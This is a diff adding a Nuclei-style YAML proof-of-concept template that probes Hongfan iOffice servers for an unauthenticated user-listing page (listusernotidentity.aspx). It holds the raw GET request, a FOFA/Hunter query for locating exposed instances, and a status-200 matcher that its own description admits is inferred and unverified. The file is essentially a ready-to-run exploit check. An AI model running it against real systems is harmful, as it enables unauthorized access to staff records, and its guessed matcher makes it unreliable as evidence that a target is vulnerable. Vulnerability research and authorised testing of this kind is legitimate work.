@@ -1,0 +1,37 @@
+id: poc-ceb7e48798d046816333
+info:
+  name: 红帆iOfficelistusernotidentity存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ceb7e48798d046816333dd0324517c2e
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ceb7e48798d046816333dd0324517c2e
+    fofa: + hunter`app.name="红帆 iOffice"`
+http:
+- raw:
+  - 'GET /ioffice/Identity/listusernotidentity.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: ASP.NET_SessionId=1a1cd045waqdktmokr3nhozw
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
